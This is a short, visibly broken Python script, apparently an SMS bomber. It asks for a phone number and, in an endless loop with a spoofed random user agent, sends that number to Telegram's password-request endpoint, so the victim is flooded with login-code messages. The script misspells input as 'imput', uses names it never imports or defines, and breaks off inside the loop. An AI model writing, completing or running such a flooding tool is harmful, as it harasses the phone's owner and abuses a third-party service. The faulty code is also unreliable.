import requests

nomer = imput("Номер")

def _sms(phone):
    global x, y
    user = fake_useragent.UserAgent().random
    headers1 = {'user_agent': user}
    print(Fore.YELLOW)

    effect(message22)

    while True:
            x += 1
            a = requests.post("https://my.telegram.org/auth/send_password",
            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от telegram отправлено!')
